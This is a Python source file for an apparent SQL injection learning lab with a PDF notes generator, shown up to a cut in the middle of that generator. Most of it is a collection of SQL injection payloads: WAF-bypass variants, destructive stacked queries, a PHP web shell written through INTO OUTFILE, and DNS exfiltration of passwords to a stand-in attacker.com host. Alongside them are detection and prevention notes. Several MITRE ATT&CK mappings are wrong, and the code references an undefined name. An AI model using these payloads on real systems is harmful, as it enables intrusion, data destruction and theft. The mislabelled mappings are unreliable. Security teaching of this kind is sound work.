#!python
import sys
# -*- coding: utf-8 -*-

 

# ============================================================
# FIX: Handle OSError 22 on Windows
# ============================================================
if sys.platform == "win32":
    try:
        import subprocess as sp
        sp.run(["chcp", "65001"], capture_output=True, shell=True)
    except:
        pass


_original_stdout_write = sys.stdout.write

def _safe_stdout_write(text):
    try:
        _original_stdout_write(text)
    except OSError as e:
        if e.errno == 22:
            try:
                clean = text.encode("ascii", "ignore").decode("ascii")
                _original_stdout_write(clean)
            except:
                pass
        else:
            raise
    except UnicodeEncodeError:
        try:
            clean = text.encode("ascii", "ignore").decode("ascii")
            _original_stdout_write(clean)
        except:
            pass

sys.stdout.write = _safe_stdout_write


"""
SQLMap Scanner & Learning Lab - DSTERMINAL Enterprise Edition v4.0
Advanced SQL Injection Learning Lab with:
- WAF Bypass Techniques
- Obfuscation Methods  
- Second-Order Injection
- Out-of-Band Exfiltration
- Automated Exploitation Chains
- MITRE ATT&CK Mapping
"""
import sys
import os
import subprocess
import random
import time
import json
import shutil
import sqlite3
import threading
import webbrowser
import hashlib
import platform
import base64
import re
from datetime import datetime, timedelta
from shutil import which
from typing import Optional, Dict, List, Set, Tuple, Any
from dataclasses import dataclass, field
from http.server import HTTPServer, BaseHTTPRequestHandler
from urllib.parse import parse_qs, urlparse
import urllib.parse
from collections import defaultdict

# ============================================================
# FIX WINDOWS CONSOLE ENCODING - MUST BE FIRST
# ============================================================
if sys.platform == "win32":
    try:
        import subprocess as sp
        sp.run(['chcp', '65001'], capture_output=True, shell=True)
    except:
        pass
    
    # Fix stdout encoding
    try:
        if hasattr(sys.stdout, 'reconfigure'):
            sys.stdout.reconfigure(encoding='utf-8', errors='ignore')
        else:
            import io
            sys.stdout = io.TextIOWrapper(sys.stdout.buffer, encoding='utf-8', errors='ignore')
    except:
        pass

# ============================================================
# ANSI COLOR DEFINITIONS (ALWAYS AVAILABLE)
# ============================================================
class Colors:
    """ANSI color codes for terminal output"""
    RED = '\033[91m'
    GREEN = '\033[92m'
    YELLOW = '\033[93m'
    BLUE = '\033[94m'
    MAGENTA = '\033[95m'
    CYAN = '\033[96m'
    WHITE = '\033[97m'
    RESET = '\033[0m'
    DIM = '\033[2m'
    ORANGE = '\033[38;5;208m'
    PURPLE = '\033[38;5;129m'
    BRIGHT_RED = '\033[91;1m'
    BRIGHT_GREEN = '\033[92;1m'
    BRIGHT_YELLOW = '\033[93;1m'
    BRIGHT_CYAN = '\033[96;1m'
    BRIGHT_MAGENTA = '\033[95;1m'
    BRIGHT_BLUE = '\033[94;1m'

class Styles:
    BRIGHT = '\033[1m'
    DIM = '\033[2m'
    NORMAL = '\033[22m'
    RESET_ALL = '\033[0m'

# ============================================================
# TRY TO IMPORT COLORAMA WITH PROPER ERROR HANDLING
# ============================================================
try:
    from colorama import init, Fore, Back, Style
    init(autoreset=True)
    COLORAMA_AVAILABLE = True
except ImportError:
    COLORAMA_AVAILABLE = False
    # Use our defined colors as fallback
    Fore = Colors
    Style = Styles
    Back = type('Back', (), {'RESET': '', 'BLACK': '', 'RED': '', 'GREEN': '', 'YELLOW': '', 'BLUE': '', 'MAGENTA': '', 'CYAN': '', 'WHITE': ''})
except Exception as e:
    COLORAMA_AVAILABLE = False
    # Use our defined colors as fallback
    Fore = Colors
    Style = Styles
    Back = type('Back', (), {'RESET': '', 'BLACK': '', 'RED': '', 'GREEN': '', 'YELLOW': '', 'BLUE': '', 'MAGENTA': '', 'CYAN': '', 'WHITE': ''})

# ============================================================
# SIMPLE SAFE PRINT FUNCTION
# ============================================================
def safe_print_unicode(message):
    """Safely print unicode/emoji characters on Windows"""
    try:
        print(message)
    except UnicodeEncodeError:
        clean_message = message.encode('ascii', 'ignore').decode('ascii')
        print(clean_message)
    except Exception:
        try:
            print(str(message))
        except:
            pass

# ============================================================
# FIX CONSOLE ENCODING (Without reassigning stdout/stderr)
# ============================================================
def fix_console_encoding():
    """Fix console encoding for Windows to display UTF-8 characters"""
    if platform.system() == 'Windows':
        try:
            import ctypes
            kernel32 = ctypes.windll.kernel32
            kernel32.SetConsoleCP(65001)
            kernel32.SetConsoleOutputCP(65001)
            
            handle = kernel32.GetStdHandle(-11)
            mode = ctypes.c_ulong()
            if kernel32.GetConsoleMode(handle, ctypes.byref(mode)):
                ENABLE_VIRTUAL_TERMINAL_PROCESSING = 0x0004
                if not (mode.value & ENABLE_VIRTUAL_TERMINAL_PROCESSING):
                    kernel32.SetConsoleMode(handle, mode.value | ENABLE_VIRTUAL_TERMINAL_PROCESSING)
        except:
            pass

# Apply encoding fix (does NOT reassign stdout/stderr)
fix_console_encoding()

# ============================================================
# RICH IMPORTS (Optional)
# ============================================================
try:
    from rich.console import Console
    from rich.live import Live
    from rich.panel import Panel
    from rich.progress import Progress, SpinnerColumn, TextColumn, BarColumn
    from rich.table import Table
    from rich.layout import Layout
    from rich.align import Align
    from rich import box
    from rich.prompt import Prompt, Confirm
    from rich.syntax import Syntax
    from rich.tree import Tree
    RICH_AVAILABLE = True
except ImportError:
    RICH_AVAILABLE = False
    Console = None

# ============================================================
# REPORTLAB IMPORTS (Optional)
# ============================================================
try:
    from reportlab.lib import colors as reportlab_colors
    from reportlab.lib.pagesizes import A4, letter
    from reportlab.platypus import SimpleDocTemplate, Paragraph, Spacer, Table, TableStyle, PageBreak, Image
    from reportlab.lib.styles import getSampleStyleSheet, ParagraphStyle
    from reportlab.lib.enums import TA_CENTER, TA_LEFT, TA_RIGHT, TA_JUSTIFY
    from reportlab.pdfgen import canvas
    from reportlab.lib.units import inch
    REPORTLAB_AVAILABLE = True
except ImportError:
    REPORTLAB_AVAILABLE = False
 

# ============================================================
# ADVANCED SQL INJECTION TECHNIQUES DATABASE
# ============================================================

ADVANCED_SQL_INJECTION_TECHNIQUES = {
    'basic': {
        'name': 'Basic SQL Injection',
        'category': 'Authentication Bypass',
        'mitre_id': 'T1190',
        'payloads': [
            "' OR '1'='1' --",
            "' OR 1=1 --",
            "' OR '1'='1' /*",
            "' OR 1=1#",
            "admin' --",
            "' OR 'x'='x",
            "' OR 1=1 LIMIT 1 --",
            "' UNION SELECT NULL--",
            "' OR '1'='1' AND '1'='1",
            "' OR '1'='1' OR '1'='1' --"
        ],
        'waf_bypass_payloads': [
            "' OR '1'='1' -- -",
            "' OR 1=1-- -",
            "' OR 1=1#",
            "' || '1'='1' --",
            "' OR 1=1 AND '1'='1' --",
            "' OR 1=1 OR '1'='1' --",
            "' OR 1=1 UNION SELECT 1,2,3 --",
            "' OR '1'='1' AND '1'='1' -- -",
            "' OR '1' LIKE '1' --",
            "' OR '1' REGEXP '1' --"
        ],
        'description': 'Basic authentication bypass using OR conditions',
        'example': "' OR '1'='1' --",
        'explanation': 'Uses tautology (always true condition) to bypass authentication. The OR condition makes WHERE clause always return TRUE, and -- comments out the rest.',
        'detection_indicators': ['Multiple failed logins followed by success', 'Unusual OR conditions in logs', 'Comment characters in input']
    },
    'union_based': {
        'name': 'Union-Based SQL Injection',
        'category': 'Data Exfiltration',
        'mitre_id': 'T1505.001',
        'payloads': [
            "' UNION SELECT 1,2,3,4,5,6,7,8 --",
            "' UNION SELECT null, username, password FROM users --",
            "' UNION SELECT 1,2,3,4,5,6,7,8 FROM users --",
            "' UNION SELECT id,username,password,email,phone,department,created_at,last_login FROM users --",
            "' UNION ALL SELECT 1,2,3,4,5,6,7,8 --",
            "' UNION SELECT 1,2,3,4,5,6,7,8 WHERE '1'='1",
            "' UNION SELECT 1,2,3,4,5,6,7,8 FROM information_schema.tables --",
            "' UNION SELECT 1,2,3,4,5,6,7,8 FROM information_schema.columns --",
            "' UNION SELECT 1,version(),database(),user(),5,6,7,8 --",
            "' UNION SELECT 1,2,3,4,5,6,7,8 FROM dual --"
        ],
        'waf_bypass_payloads': [
            "' UNION/*!50000SELECT*/1,2,3,4,5,6,7,8 --",
            "' UNION SELECT 1,2,3,4,5,6,7,8/*!*/--",
            "' UNION SELECT 1,2,3,4,5,6,7,8 FROM/*!*/users --",
            "' UNION SELECT 1,2,3,4,5,6,7,8 WHERE '1'='1' --",
            "' UNION SELECT 1,2,3,4,5,6,7,8/**/FROM/**/users --",
            "' UNION SELECT 1,2,3,4,5,6,7,8 FROM (SELECT 1,2,3,4,5,6,7,8) AS x --",
            "' UNION SELECT 1,2,3,4,5,6,7,8 FROM users WHERE '1'='1' --",
            "' UNION SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL --"
        ],
        'description': 'Extract data from other tables using UNION queries',
        'example': "' UNION SELECT 1,2,3,4,5,6,7,8 --",
        'explanation': 'UNION operator combines results of two queries. By injecting UNION SELECT, you can retrieve data from other tables. Numbers must match column count.',
        'detection_indicators': ['Column count mismatch errors', 'UNION keyword in queries', 'Unusual data in response']
    },
    'error_based': {
        'name': 'Error-Based SQL Injection',
        'category': 'Information Disclosure',
        'mitre_id': 'T1526',
        'payloads': [
            "' AND 1=CONVERT(int, @@version) --",
            "' AND 1=CAST((SELECT @@version) AS int) --",
            "' AND 1=CONVERT(int, (SELECT TOP 1 username FROM users)) --",
            "' AND 1=CONVERT(int, (SELECT DB_NAME())) --",
            "' AND 1=CONVERT(int, @@servername) --",
            "' AND 1=CONVERT(int, @@servicename) --",
            "' AND 1=CONVERT(int, @@language) --",
            "' AND 1=CONVERT(int, @@max_connections) --",
            "' AND 1=CONVERT(int, (SELECT COUNT(*) FROM users)) --",
            "' AND 1=CONVERT(int, (SELECT MIN(id) FROM users)) --"
        ],
        'waf_bypass_payloads': [
            "' AND 1=CONVERT(INT, (SELECT TOP 1 username FROM users)) --",
            "' AND 1=CAST((SELECT TOP 1 username FROM users) AS INT) --",
            "' AND 1=CONVERT(INT, (SELECT TOP 1 username FROM users) + '') --",
            "' AND 1=CONVERT(INT, (SELECT TOP 1 username FROM users) + CHAR(64)) --",
            "' AND 1=CONVERT(INT, (SELECT TOP 1 username FROM users) + @@VERSION) --",
            "' AND 1=CONVERT(INT, (SELECT TOP 1 username FROM users) + ':' + @@VERSION) --"
        ],
        'description': 'Extract information through database error messages',
        'example': "' AND 1=CONVERT(int, @@version) --",
        'explanation': 'Error-based injection forces database to generate error messages containing useful information. CONVERT function attempts to convert data to different type, causing error.',
        'detection_indicators': ['Database error messages in responses', 'Conversion errors', 'Unusual error patterns']
    },
    'boolean_based': {
        'name': 'Boolean-Based Blind SQL Injection',
        'category': 'Blind Exploitation',
        'mitre_id': 'T1204.002',
        'payloads': [
            "' AND 1=1 --",
            "' AND 1=2 --",
            "' AND (SELECT COUNT(*) FROM users) = 8 --",
            "' AND (SELECT COUNT(*) FROM users) > 5 --",
            "' AND (SELECT COUNT(*) FROM users) < 10 --",
            "' AND '1'='1' --",
            "' AND '1'='2' --",
            "' AND LENGTH((SELECT TOP 1 username FROM users)) = 5 --",
            "' AND SUBSTRING((SELECT TOP 1 username FROM users),1,1) = 'a' --",
            "' AND ASCII(SUBSTRING((SELECT TOP 1 username FROM users),1,1)) = 97 --"
        ],
        'waf_bypass_payloads': [
            "' AND 1=1 AND '1'='1' --",
            "' AND 1=1 AND (SELECT 1 FROM DUAL WHERE 1=1) --",
            "' AND 1=1 AND (SELECT COUNT(*) FROM users WHERE 1=1) --",
            "' AND 1=1 AND (SELECT LENGTH((SELECT username FROM users LIMIT 1))) = 5 --"
        ],
        'description': 'Extract information based on true/false responses',
        'example': "' AND 1=1 --",
        'explanation': 'Boolean-based injection uses conditional statements to extract information one bit at a time. Application responds differently based on whether condition is true or false.',
        'detection_indicators': ['Different response lengths', 'Different HTTP status codes', 'Pattern of true/false responses']
    },
    'time_based': {
        'name': 'Time-Based Blind SQL Injection',
        'category': 'Blind Exploitation',
        'mitre_id': 'T1204.002',
        'payloads': [
            "' AND SLEEP(5) --",
            "' AND WAITFOR DELAY '0:0:5' --",
            "' AND (SELECT COUNT(*) FROM users) = 8 AND SLEEP(5) --",
            "' AND (SELECT COUNT(*) FROM users) > 5 AND SLEEP(5) --",
            "' AND IF(1=1, SLEEP(5), 0) --",
            "' AND BENCHMARK(1000000, MD5('test')) --",
            "' AND pg_sleep(5) --",
            "' AND (SELECT CASE WHEN (1=1) THEN SLEEP(5) ELSE 0 END) --",
            "' AND (SELECT COUNT(*) FROM users) = 8 AND pg_sleep(5) --",
            "' AND IF((SELECT COUNT(*) FROM users)=8, SLEEP(5), 0) --"
        ],
        'waf_bypass_payloads': [
            "' AND SLEEP(5) AND '1'='1' --",
            "' AND (SELECT CASE WHEN 1=1 THEN SLEEP(5) ELSE 0 END) --",
            "' AND (SELECT CASE WHEN (SELECT 1 FROM DUAL WHERE 1=1) THEN SLEEP(5) ELSE 0 END) --",
            "' AND (SELECT 1 FROM DUAL WHERE 1=1 AND SLEEP(5)) --"
        ],
        'description': 'Extract information by observing time delays',
        'example': "' AND SLEEP(5) --",
        'explanation': 'Time-based injection uses time delays to extract information. If condition is true, database waits for specified time. By measuring response times, you can infer information.',
        'detection_indicators': ['Response time variations', 'SLEEP/WAITFOR keywords in logs', 'Unusual query execution times']
    },
    'stacked_queries': {
        'name': 'Stacked Queries SQL Injection',
        'category': 'Command Execution',
        'mitre_id': 'T1059.001',
        'payloads': [
            "'; DROP TABLE users --",
            "'; UPDATE users SET password='hacked' WHERE username='admin' --",
            "'; DELETE FROM orders WHERE user_id=1 --",
            "'; INSERT INTO users (username,password) VALUES ('hacker','pwned') --",
            "'; CREATE TABLE hacked (id INT, data VARCHAR(100)) --",
            "'; ALTER TABLE users ADD COLUMN hacked INT --",
            "'; EXEC xp_cmdshell('dir') --",
            "'; SELECT * INTO tmp FROM users --",
            "'; DROP TABLE tmp --",
            "'; TRUNCATE TABLE logs --"
        ],
        'waf_bypass_payloads': [
            "'; DROP TABLE/*!*/users --",
            "'; UPDATE/*!*/users SET password='hacked' WHERE username='admin' --",
            "'; EXEC/*!*/xp_cmdshell('dir') --",
            "';/*!*/DROP TABLE users --",
            "'; DROP TABLE users/*!*/--"
        ],
        'description': 'Execute multiple SQL statements in a single query',
        'example': "'; DROP TABLE users --",
        'explanation': 'Stacked queries allow execution of multiple SQL statements. Extremely dangerous as it can modify or destroy data. Semicolon separates statements, -- comments out rest.',
        'detection_indicators': ['Multiple statements in single query', 'DROP/DELETE/UPDATE keywords', 'Database modification attempts']
    },
    'out_of_band': {
        'name': 'Out-of-Band SQL Injection',
        'category': 'Data Exfiltration',
        'mitre_id': 'T1048',
        'payloads': [
            "' AND (SELECT * FROM (SELECT(SLEEP(5)))a) --",
            "' UNION SELECT LOAD_FILE(CONCAT('\\\\', (SELECT password FROM users LIMIT 1), '.attacker.com\\test')) --",
            "' AND (SELECT * FROM (SELECT(SLEEP(5)))a) --",
            "' UNION SELECT '<?php system($_GET[cmd]); ?>' INTO OUTFILE '/var/www/html/shell.php' --",
            "' UNION SELECT '<?php system($_GET[cmd]); ?>' INTO DUMPFILE '/var/www/html/shell.php' --",
            "' AND (SELECT * FROM (SELECT(SLEEP(5)))a) --"
        ],
        'waf_bypass_payloads': [
            "' AND (SELECT * FROM (SELECT(SLEEP(5)))a) --",
            "' UNION SELECT CONCAT('\\\\', (SELECT password FROM users LIMIT 1), '.attacker.com\\test') --"
        ],
        'description': 'Exfiltrate data through DNS or HTTP channels',
        'example': "' UNION SELECT LOAD_FILE(CONCAT('\\\\', (SELECT password FROM users LIMIT 1), '.attacker.com\\test')) --",
        'explanation': 'Out-of-band injection uses DNS or HTTP requests to exfiltrate data. Database server makes external request containing stolen data to attacker-controlled server.',
        'detection_indicators': ['Unusual DNS queries', 'External network connections from DB server', 'Suspicious outbound traffic']
    },
    'second_order': {
        'name': 'Second-Order SQL Injection',
        'category': 'Advanced Exploitation',
        'mitre_id': 'T1190',
        'payloads': [
            "' OR '1'='1' -- (stored then executed)",
            "' UNION SELECT 1,2,3,4,5,6,7,8 -- (stored then executed)"
        ],
        'waf_bypass_payloads': [
            "' OR '1'='1' -- - (stored then executed)",
            "' UNION SELECT 1,2,3,4,5,6,7,8/*!*/-- (stored then executed)"
        ],
        'description': 'Injection that is stored then executed later',
        'example': "' OR '1'='1' -- (stored then executed)",
        'explanation': 'Second-order injection occurs when malicious input is stored in database then later used in vulnerable query. Harder to detect as input appears legitimate initially.',
        'detection_indicators': ['Injection characters in stored data', 'Delayed execution of malicious payloads', 'Retrospective detection required']
    }
}

# ============================================================
# WAF BYPASS TECHNIQUES
# ============================================================

WAF_BYPASS_TECHNIQUES = {
    'comment_obfuscation': {
        'name': 'Comment Obfuscation',
        'description': 'Use SQL comments to bypass WAF signatures',
        'examples': [
            "SELECT/**/1,2,3,4,5,6,7,8/**/FROM/**/users",
            "SELECT/*!50000*/1,2,3,4,5,6,7,8/*!*/FROM/*!*/users",
            "SELECT-- -1,2,3,4,5,6,7,8-- -FROM-- -users"
        ],
        'detection': 'Look for comment characters (/**/, --, #) in unexpected places'
    },
    'encoding_evasion': {
        'name': 'Encoding Evasion',
        'description': 'Use different encodings to bypass WAF filters',
        'examples': [
            "'%4f%52%20%27%31%27%3d%27%31%27'",  # URL encoding
            "' OR '1'='1' -- (hex encoded)",
            "'\x4f\x52\x20\x27\x31\x27\x3d\x27\x31\x27'",  # Hex encoding
            "' OR '1'='1' -- (base64 encoded)"
        ],
        'detection': 'Monitor for unusual encoding patterns and decoded payloads'
    },
    'case_manipulation': {
        'name': 'Case Manipulation',
        'description': 'Mix case to bypass case-sensitive WAF rules',
        'examples': [
            "' Or 1=1 --",
            "' oR 1=1 --",
            "' UnIoN SeLeCt 1,2,3 --",
            "' UnIoN/*!50000*/SeLeCt 1,2,3 --"
        ],
        'detection': 'Look for mixed case keywords and suspicious patterns'
    },
    'null_byte_injection': {
        'name': 'Null Byte Injection',
        'description': 'Inject null bytes to bypass WAF filtering',
        'examples': [
            "'%00 OR 1=1 --",
            "'%00 UNION SELECT 1,2,3 --",
            "'%00' OR '1'='1' --"
        ],
        'detection': 'Monitor for null bytes in input and unusual character sequences'
    },
    'buffer_overflow': {
        'name': 'WAF Buffer Overflow',
        'description': 'Overflow WAF buffers with large payloads',
        'examples': [
            "'" + "A"*5000 + " OR 1=1 --",
            "'" + "A"*10000 + " UNION SELECT 1,2,3 --"
        ],
        'detection': 'Monitor for unusually large request sizes and patterns'
    },
    'sql_comments': {
        'name': 'SQL Comment Manipulation',
        'description': 'Use SQL comments to hide payload components',
        'examples': [
            "' OR 1=1 /*!*/ --",
            "' UNION SELECT 1,2,3 /*!*/ FROM users --",
            "' OR 1=1 /*!50000*/ --"
        ],
        'detection': 'Look for version-specific comments and unusual comment patterns'
    }
}

# ============================================================
# MITRE ATT&CK MAPPING
# ============================================================

MITRE_ATTACK_MAPPING = {
    'T1190': {'name': 'Exploit Public-Facing Application', 'technique': 'SQL Injection'},
    'T1505.001': {'name': 'Server Software Component: SQL Stored Procedures', 'technique': 'SQL Injection'},
    'T1526': {'name': 'Cloud Service Dashboard', 'technique': 'Information Disclosure'},
    'T1204.002': {'name': 'User Execution: Malicious File', 'technique': 'Blind SQL Injection'},
    'T1059.001': {'name': 'Command and Scripting Interpreter: PowerShell', 'technique': 'Command Execution'},
    'T1048': {'name': 'Exfiltration Over Alternative Protocol', 'technique': 'Data Exfiltration'},
    'T1486': {'name': 'Data Encrypted for Impact', 'technique': 'Ransomware-like Behavior'},
    'T1562.001': {'name': 'Impair Defenses: Disable or Modify Tools', 'technique': 'Defense Evasion'}
}

# ============================================================
# PDF NOTES GENERATOR (Enhanced)
# ============================================================

class EnhancedPDFNotesGenerator:
    """Generate enhanced PDF notes for SQL Injection Learning Lab with advanced techniques"""
    
    def __init__(self, console=None):
        self.console = console or Console() if RICH_AVAILABLE else None
        self.export_dir = os.path.expanduser("~/DSTerminal_Workspace/notes")
        os.makedirs(self.export_dir, exist_ok=True)
    
    def generate_notes(self, include_techniques: bool = True, include_waf: bool = True) -> Optional[str]:
        """Generate enhanced PDF notes with advanced techniques and WAF bypass"""
        if not REPORTLAB_AVAILABLE:
            if self.console:
                self.console.print("[red]ReportLab not installed. PDF generation requires: pip install reportlab[/red]")
            return None
        
        try:
            timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
            filename = os.path.join(self.export_dir, f"advanced_sql_injection_notes_{timestamp}.pdf")
            
            # Create PDF document
            doc = SimpleDocTemplate(
                filename,
                pagesize=A4,
                rightMargin=72,
                leftMargin=72,
                topMargin=72,
                bottomMargin=72
            )
            
            story = []
            styles = getSampleStyleSheet()
            
            # Custom styles
            title_style = ParagraphStyle(
                'CustomTitle',
                parent=styles['Heading1'],
                fontSize=28,
                textColor=colors.HexColor('#0066cc'),
                alignment=TA_CENTER,
                spaceAfter=30,
                fontName='Helvetica-Bold'
            )
            
            subtitle_style = ParagraphStyle(
                'Subtitle',
                parent=styles['Normal'],
                fontSize=14,
                textColor=colors.HexColor('#666666'),
                alignment=TA_CENTER,
                spaceAfter=20
            )
            
            heading_style = ParagraphStyle(
                'Heading',
                parent=styles['Heading2'],
                fontSize=18,
                textColor=colors.HexColor('#004d99'),
                spaceAfter=12,
                spaceBefore=18,
                fontName='Helvetica-Bold'
            )
            
            subheading_style = ParagraphStyle(
                'SubHeading',
                parent=styles['Heading3'],
                fontSize=14,
                textColor=colors.HexColor('#0066cc'),
                spaceAfter=8,
                spaceBefore=12,
                fontName='Helvetica-Bold'
            )
            
            body_style = ParagraphStyle(
                'Body',
                parent=styles['Normal'],
                fontSize=10,
                textColor=colors.HexColor('#333333'),
                alignment=TA_LEFT,
                spaceAfter=6,
                fontName='Helvetica'
            )
            
            code_style = ParagraphStyle(
                'Code',
                parent=styles['Normal'],
                fontSize=9,
                textColor=colors.HexColor('#006600'),
                alignment=TA_LEFT,
                spaceAfter=4,
                fontName='Courier'
            )
            
            footer_style = ParagraphStyle(
                'Footer',
                parent=styles['Normal'],
                fontSize=8,
                textColor=colors.HexColor('#666666'),
                alignment=TA_CENTER,
                spaceAfter=4
            )
            
            # Watermark function
            def add_watermark(canvas_obj, doc_obj):
                canvas_obj.saveState()
                
                # Main watermark - diagonal
                canvas_obj.setFillColor(colors.HexColor('#cccccc'))
                canvas_obj.setFont('Helvetica-Bold', 60)
                canvas_obj.rotate(45)
                canvas_obj.drawString(200, 150, "DSTERMINAL v4.0")
                
                # Secondary watermark - smaller
                canvas_obj.setFillColor(colors.HexColor('#dddddd'))
                canvas_obj.setFont('Helvetica', 30)
                canvas_obj.rotate(-30)
                canvas_obj.drawString(450, -100, "Advanced Edition")
                
                # Footer watermark
                canvas_obj.setFillColor(colors.HexColor('#eeeeee'))
                canvas_obj.setFont('Helvetica', 10)
                canvas_obj.rotate(0)
                canvas_obj.drawString(300, 30, "Generated by DSTERMINAL v4.0 - Advanced SQL Injection Lab")
                
                canvas_obj.restoreState()
            
            # ================================================================
            # BUILD PDF CONTENT
            # ================================================================
            
            # Title
            story.append(Paragraph("Advanced SQL Injection Learning Notes", title_style))
            story.append(Paragraph("Enterprise Edition - Complete Guide to Modern SQL Injection Techniques", subtitle_style))
            story.append(Spacer(1, 12))
            
            # Metadata
            meta_style = ParagraphStyle(
                'Meta',
                parent=styles['Normal'],
                fontSize=10,
                textColor=colors.grey,
                alignment=TA_LEFT
            )
            
            metadata = [
                f"<b>Generated:</b> {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}",
                f"<b>Version:</b> DSTERMINAL v4.0 - Advanced Edition",
                f"<b>Classification:</b> Educational Material - Advanced SQL Injection Lab",
                f"<b>MITRE ATT&CK Coverage:</b> 7+ Techniques"
            ]
            
            for meta in metadata:
                story.append(Paragraph(meta, meta_style))
            story.append(Spacer(1, 20))
            
            # ================================================================
            # SECTION 1: Introduction to Advanced SQL Injection
            # ================================================================
            story.append(Paragraph("1. Advanced SQL Injection Overview", heading_style))
            story.append(Paragraph(
                "SQL Injection remains the most critical web application vulnerability in OWASP Top 10. "
                "Modern attackers use sophisticated techniques to bypass WAFs, evade detection, and exfiltrate "
                "data through alternative channels. This guide covers enterprise-level SQL injection techniques.",
                body_style
            ))
            story.append(Spacer(1, 10))
            
            story.append(Paragraph("1.1 Modern Threat Landscape", subheading_style))
            story.append(Paragraph(
                "Current SQL injection attacks feature:",
                body_style
            ))
            story.append(Paragraph(
                "- <b>Automated exploitation</b> using tools like SQLMap, sqlmap.py, and custom scripts",
                body_style
            ))
            story.append(Paragraph(
                "- <b>WAF bypass</b> using obfuscation, encoding, and fragmentation techniques",
                body_style
            ))
            story.append(Paragraph(
                "- <b>Second-order injection</b> where payloads are stored then executed",
                body_style
            ))
            story.append(Paragraph(
                "- <b>Out-of-band exfiltration</b> using DNS, HTTP, or ICMP channels",
                body_style
            ))
            story.append(Paragraph(
                "- <b>Automated exploitation chains</b> combining multiple techniques",
                body_style
            ))
            story.append(Spacer(1, 10))
            
            # ================================================================
            # SECTION 2: Advanced SQL Injection Techniques
            # ================================================================
            story.append(PageBreak())
            story.append(Paragraph("2. Advanced SQL Injection Techniques", heading_style))
            
            for tech_id, tech in ADVANCED_SQL_INJECTION_TECHNIQUES.items():
                story.append(Paragraph(f"2.{list(ADVANCED_SQL_INJECTION_TECHNIQUES.keys()).index(tech_id) + 1} {tech['name']}", subheading_style))
                story.append(Paragraph(f"<b>Category:</b> {tech['category']}", body_style))
                story.append(Paragraph(f"<b>MITRE ID:</b> {tech['mitre_id']}", body_style))
                story.append(Paragraph(f"<b>Description:</b> {tech['description']}", body_style))
                story.append(Paragraph(f"<b>Example Payload:</b> <i>{tech['example']}</i>", body_style))
                story.append(Paragraph(f"<b>How It Works:</b> {tech['explanation']}", body_style))
                
                # Show WAF bypass payloads
                if 'waf_bypass_payloads' in tech:
                    story.append(Paragraph("<b>WAF Bypass Payloads:</b>", body_style))
                    for payload in tech['waf_bypass_payloads'][:3]:
                        story.append(Paragraph(f"- <i>{payload}</i>", code_style))
                    if len(tech['waf_bypass_payloads']) > 3:
                        story.append(Paragraph(f"- ... and {len(tech['waf_bypass_payloads']) - 3} more WAF bypass payloads", body_style))
                
                # Show detection indicators
                if 'detection_indicators' in tech:
                    story.append(Paragraph("<b>Detection Indicators:</b>", body_style))
                    for indicator in tech['detection_indicators']:
                        story.append(Paragraph(f"- {indicator}", body_style))
                
                story.append(Spacer(1, 10))
            
            # ================================================================
            # SECTION 3: WAF Bypass Techniques
            # ================================================================
            story.append(PageBreak())
            story.append(Paragraph("3. WAF Bypass Techniques", heading_style))
            
            for bypass_id, bypass in WAF_BYPASS_TECHNIQUES.items():
                story.append(Paragraph(f"3.{list(WAF_BYPASS_TECHNIQUES.keys()).index(bypass_id) + 1} {bypass['name']}", subheading_style))
                story.append(Paragraph(f"<b>Description:</b> {bypass['description']}", body_style))
                
                story.append(Paragraph("<b>Examples:</b>", body_style))
                for example in bypass['examples'][:3]:
                    story.append(Paragraph(f"- <i>{example}</i>", code_style))
                if len(bypass['examples']) > 3:
                    story.append(Paragraph(f"- ... and {len(bypass['examples']) - 3} more examples", body_style))
                
                story.append(Paragraph(f"<b>Detection:</b> {bypass['detection']}", body_style))
                story.append(Spacer(1, 6))
            
            # ================================================================
            # SECTION 4: MITRE ATT&CK Mapping
            # ================================================================
            story.append(PageBreak())
            story.append(Paragraph("4. MITRE ATT&CK Framework Mapping", heading_style))
            
            story.append(Paragraph(
                "Understanding SQL injection attacks in the context of the MITRE ATT&CK framework "
                "helps defenders identify tactics, techniques, and procedures (TTPs) used by adversaries.",
                body_style
            ))
            story.append(Spacer(1, 10))
            
            for mitre_id, mitre_data in MITRE_ATTACK_MAPPING.items():
                story.append(Paragraph(f"<b>{mitre_id}:</b> {mitre_data['name']}", subheading_style))
                story.append(Paragraph(f"Technique: {mitre_data['technique']}", body_style))
                story.append(Paragraph(f"Impact: {mitre_data.get('impact', 'Varies based on exploitation')}", body_style))
                story.append(Spacer(1, 6))
            
            # ================================================================
            # SECTION 5: Detection and Prevention
            # ================================================================
            story.append(PageBreak())
            story.append(Paragraph("5. Advanced Detection and Prevention", heading_style))
            
            story.append(Paragraph("5.1 Detection Strategies", subheading_style))
            detection_strategies = [
                "- <b>WAF Log Analysis:</b> Monitor for encoded payloads, null bytes, and SQL keywords",
                "- <b>Database Audit Logs:</b> Track unusual queries and error patterns",
                "- <b>Network Monitoring:</b> Detect outbound DNS/HTTP requests from database servers",
                "- <b>Application Performance:</b> Monitor for response time anomalies",
                "- <b>User Behavior Analytics:</b> Detect unusual input patterns"
            ]
            for strategy in detection_strategies:
                story.append(Paragraph(strategy, body_style))
            story.append(Spacer(1, 10))
            
            story.append(Paragraph("5.2 Prevention Best Practices", subheading_style))
            prevention_methods = [
                "- <b>Parameterized Queries:</b> Always use prepared statements",
                "- <b>Input Validation:</b> Implement strict allowlists",
                "- <b>Least Privilege:</b> Database accounts with minimal permissions",
                "- <b>WAF Configuration:</b> Regular updates and custom rules",
                "- <b>Secure Code Review:</b> Automated and manual reviews",
                "- <b>Regular Penetration Testing:</b> Professional security assessments"
            ]
            for method in prevention_methods:
                story.append(Paragraph(method, body_style))
            story.append(Spacer(1, 10))
            
            # ================================================================
            # SECTION 6: Hands-On Exercises
            # ================================================================
            story.append(PageBreak())
            story.append(Paragraph("6. Hands-On Exercises", heading_style))
            
            exercises = [
                ("6.1 Basic SQL Injection", "Use ' OR '1'='1' -- to bypass authentication"),
                ("6.2 Union-Based Injection", "Extract user data using UNION SELECT"),
                ("6.3 Blind SQL Injection", "Extract data using boolean/time-based techniques"),
                ("6.4 WAF Bypass", "Use comment obfuscation to bypass WAF"),
                ("6.5 Out-of-Band Exfiltration", "Exfiltrate data using DNS queries"),
                ("6.6 Second-Order Injection", "Store payload for later execution")
            ]
            
            for ex_num, ex_desc in exercises:
                story.append(Paragraph(f"{ex_num}", subheading_style))
                story.append(Paragraph(ex_desc, body_style))
                story.append(Spacer(1, 6))
            
            # ================================================================
            # SECTION 7: Summary
